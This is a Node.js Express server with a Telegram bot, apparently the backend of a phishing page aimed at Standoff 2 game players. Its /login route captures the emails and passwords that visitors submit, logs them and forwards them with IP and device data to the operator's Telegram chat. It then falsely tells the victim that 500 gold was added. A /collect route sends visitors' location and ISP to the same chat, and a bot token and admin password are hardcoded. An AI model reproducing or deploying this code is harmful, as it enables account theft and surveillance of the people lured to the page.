const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const app = express();

// ===== НАСТРОЙКИ =====
const BOT_TOKEN = '8699335543:AAHUe_Ht9gCNI7cnBa3l6jvp315xTQKv0LQ';
const ADMIN_ID = 5015075680;
const ADMIN_USER = 'admin';
const ADMIN_PASS = 'standoff2026';

// ===== TELEGRAM-БОТ =====
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
console.log('🤖 Telegram-бот запущен');

bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id,
        '🔐 *Бот уведомлений Standoff 2*\n\nТвой chat\\_id: `' + msg.chat.id + '`',
        { parse_mode: 'Markdown' }
    );
});

bot.onText(/\/test/, (msg) => {
    bot.sendMessage(ADMIN_ID, '✅ Тест пройден, бот работает!');
});

// ===== ОТПРАВКА УВЕДОМЛЕНИЙ =====
function sendAccount(data) {
    const text =
        '🔐 *НОВЫЙ АККАУНТ*\n' +
        '━━━━━━━━━━━━━━━━━━\n' +
        '📧 Почта: `' + (data.email || '?') + '`\n' +
        '🔑 Пароль: `' + (data.password || '?') + '`\n' +
        '🌐 IP: `' + (data.ip || '?') + '`\n' +
        '📱 Устройство: ' + ((data.user_agent || '').substring(0, 50)) + '...\n' +
        '🕒 Время: ' + new Date().toLocaleString('ru-RU');
    bot.sendMessage(ADMIN_ID, text, { parse_mode: 'Markdown' })
        .catch(err => console.error('TG:', err.message));
}

function sendVisitor(data) {
    const text =
        '👤 *НОВЫЙ ПОСЕТИТЕЛЬ*\n' +
        '━━━━━━━━━━━━━━━━━━\n' +
        '🌐 IP: `' + (data.ip || '?') + '`\n' +
        '🌍 Страна: ' + (data.country || '?') + '\n' +
        '🏙 Город: ' + (data.city || '?') + '\n' +
        '📡 Провайдер: ' + (data.org || '?') + '\n' +
        '📺 Экран: ' + (data.screen || '?') + '\n' +
        '🕒 Время: ' + new Date().toLocaleString('ru-RU');
    bot.sendMessage(ADMIN_ID, text, { parse_mode: 'Markdown' })
        .catch(err => console.error('TG:', err.message));
}

// ===== EXPRESS =====
app.use(express.json());
app.use(express.static('public'));

function auth(req, res, next) {
    const b64 = (req.headers.authorization || '').split(' ')[1] || '';
    const [user, pass] = Buffer.from(b64, 'base64').toString().split(':');
    if (user === ADMIN_USER && pass === ADMIN_PASS) return next();
    res.set('WWW-Authenticate', 'Basic realm="Admin"');
    return res.status(401).send('Access denied');
}

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ===== СБОР ПОСЕТИТЕЛЕЙ =====
app.post('/collect', (req, res) => {
    const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').replace('::ffff:', '');
    const geo = req.body.geo || {};
    const screen = req.body.screen || {};

    console.log('👤 Посетитель: ' + ip + ' | ' + (geo.country || '?') + ', ' + (geo.city || '?'));

    sendVisitor({
        ip: ip,
        country: geo.country,
        city: geo.city,
        org: geo.org,
        screen: (screen.w || '?') + 'x' + (screen.h || '?')
    });

    res.json({ ok: true });
});

// ===== ЛОГИН =====
app.post('/login', (req, res) => {
    const { email, password } = req.body;
    const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').replace('::ffff:', '');
    const ua = req.headers['user-agent'] || 'unknown';

    if (!email || !password) return res.status(400).json({ error: 'Fill all fields' });

    console.log('🔐 Аккаунт: ' + email + ' : ' + password);

    sendAccount({ email, password, ip, user_agent: ua });

    res.json({ success: true, message: '500 gold added!' });
});

// ===== АДМИНКА =====
app.get('/admin', auth, (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

app.listen(3000, () => {
    console.log('Server started on http://localhost:3000');
});
